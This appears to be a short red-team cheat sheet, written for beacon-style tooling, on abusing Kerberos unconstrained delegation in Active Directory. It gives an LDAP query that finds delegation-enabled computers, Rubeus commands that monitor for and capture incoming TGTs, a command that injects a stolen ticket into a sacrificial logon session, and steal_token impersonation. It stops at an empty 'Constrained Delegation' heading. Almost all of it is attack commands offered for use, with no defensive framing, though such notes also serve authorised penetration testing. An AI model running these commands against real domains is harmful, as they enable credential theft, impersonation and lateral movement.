
##### Unconstrained Delegation
Search for computers configured for Unconstrained Delegation
```powershell
ldapsearch (&(samAccountType=805306369 (userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

SYSTEM level beacon - Monitor for incoming TGTs on host
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
```

Stop Rubeus
```powershell
jobs
jobkill 0
```

Inject TGT into sacrificial logon session
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:
```

Impersonate spawned process and confirm
```powershell
steal_token [PID]
run klist

rev2self       <--- Drop impersonation
kill [PID]
```

##### Constrained Delegation
